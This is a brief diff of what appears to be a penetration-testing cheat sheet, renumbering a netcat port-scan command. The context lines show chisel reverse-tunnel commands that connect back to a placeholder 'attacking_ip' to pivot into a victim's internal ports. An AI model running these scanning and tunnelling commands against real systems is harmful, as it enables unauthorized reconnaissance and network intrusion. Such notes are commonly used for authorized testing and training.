@@ -12,4 +12,4 @@ a. chisel server -p 8000 --reverse
 a. chisel client attacking_ip:8000 R:listening_port:victim_ip:target_port
 
 ### **nc Port scan:**
-nc -z -w 1 -v IP PORTRANGE (start-end) 2>&1 | grep -I succeeded
+1. nc -z -w 1 -v IP PORTRANGE (start-end) 2>&1 | grep -I succeeded
